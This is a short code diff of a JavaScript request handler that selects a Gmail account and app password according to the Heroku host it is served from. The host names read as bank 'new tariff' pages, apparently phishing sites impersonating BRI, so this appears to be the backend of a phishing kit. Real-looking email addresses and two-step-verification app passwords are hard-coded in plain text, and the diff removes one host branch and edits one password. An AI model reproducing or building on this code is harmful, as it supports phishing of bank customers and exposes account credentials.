@@ -6,12 +6,6 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
-   
-    if (url == 'pilihan-tarif-baru.herokuapp.com'){
-
-       email = 'lajutobo74@gmail.com'
-       pass = 'bbuxjxmlaopbnprv'
-    }else
     
     if (url == 'pilih-tarif-baru-bri.herokuapp.com'){
 
@@ -35,7 +29,7 @@ export default function handler(req, res) {
     {
 
         email = 'suksesk541@gmail.com'; //email
-        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'stpqngfmbqh'; //sandi aplikasi dari verifikasi 2 langkah
         
 
     }
